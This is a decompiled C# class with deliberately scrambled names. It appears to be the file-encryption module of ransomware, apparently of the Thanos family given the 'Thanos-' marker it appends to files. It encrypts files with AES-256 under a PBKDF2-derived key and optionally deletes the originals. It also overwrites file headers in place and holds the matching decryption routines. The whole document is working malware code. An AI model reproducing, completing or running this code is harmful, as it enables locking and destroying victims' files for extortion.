using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace JcxFVLIspytryi;

public static class JEEjYAYTthGQk
{
	public const int zLPWbbERHSvDnJ = 256;

	public static byte[] YYrPHqXqYbutb(int tAiRLAEswZWElR)
	{
		byte[] array = new byte[tAiRLAEswZWElR];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool QjVWSolGPKV(string RBVmIJjYkAsr, byte[] FPDBZcfhYtHQ, bool mdTRAGgKXOU)
	{
		byte[] array = YYrPHqXqYbutb(16);
		using FileStream fileStream = new FileStream(RBVmIJjYkAsr + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = qIoqFQTjYVj(FPDBZcfhYtHQ, array);
		FPDBZcfhYtHQ = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(RBVmIJjYkAsr, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (mdTRAGgKXOU)
			{
				File.Delete(RBVmIJjYkAsr);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool cUNJQPsPZavxU(string XKPtPPpZsOiplQXj, byte[] VhAJXjdPfSOPrfcq, bool CBTTndYcuQT)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(XKPtPPpZsOiplQXj, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = qIoqFQTjYVj(VhAJXjdPfSOPrfcq, array);
		VhAJXjdPfSOPrfcq = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(XKPtPPpZsOiplQXj.Remove(XKPtPPpZsOiplQXj.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] dYFSNeFMIygNvr(byte[] QELtlVjpGyNbL, byte[] QDKUYnqPhvoCoo, byte[] YqCKCjHeGsE)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = qIoqFQTjYVj(QDKUYnqPhvoCoo, YqCKCjHeGsE);
		QDKUYnqPhvoCoo = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(QELtlVjpGyNbL, 0, QELtlVjpGyNbL.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static byte[] cIdFgHvijOt(byte[] zLxVyGTZEs, byte[] MUUCZaCWFNaTLK, byte[] uZKInCUIhqsJ)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = qIoqFQTjYVj(MUUCZaCWFNaTLK, uZKInCUIhqsJ);
		MUUCZaCWFNaTLK = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(zLxVyGTZEs, 0, zLxVyGTZEs.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static bool sNqipTaZoT(byte[] RVEJexctdAEn, byte[] yiedzJXozcAndKjuZb, byte[] IKbBUMvhXjlulTJ)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = qIoqFQTjYVj(RVEJexctdAEn, yiedzJXozcAndKjuZb);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(IKbBUMvhXjlulTJ);
	}

	public static Rfc2898DeriveBytes qIoqFQTjYVj(byte[] kLHvbgAbQfTYK, byte[] MXSIgxOtoLt)
	{
		return new Rfc2898DeriveBytes(kLHvbgAbQfTYK, MXSIgxOtoLt, 52768);
	}

	public static byte[] vrYKkYAgynL(string YmbMXeejJM, int ezZDYJnkPekTy)
	{
		FileStream fileStream = new FileStream(YmbMXeejJM, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
		byte[] array = new byte[ezZDYJnkPekTy];
		fileStream.Read(array, 0, ezZDYJnkPekTy);
		fileStream.Close();
		fileStream.Dispose();
		return array;
	}

	public static void HOLazjWLXiaC(string BygzKEsgCMJyvvIJ, byte[] PkaxVhkfjwFvUR)
	{
		FileStream fileStream = new FileStream(BygzKEsgCMJyvvIJ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
		fileStream.Write(PkaxVhkfjwFvUR, 0, PkaxVhkfjwFvUR.Length);
		fileStream.Close();
		fileStream.Dispose();
		byte[] bytes = Encoding.ASCII.GetBytes("Thanos-" + Convert.ToString(dHGXNFcRMdII.cCwjTHNTri) + "-");
		using FileStream fileStream2 = new FileStream(BygzKEsgCMJyvvIJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
		fileStream2.Write(bytes, 0, bytes.Length);
	}
}
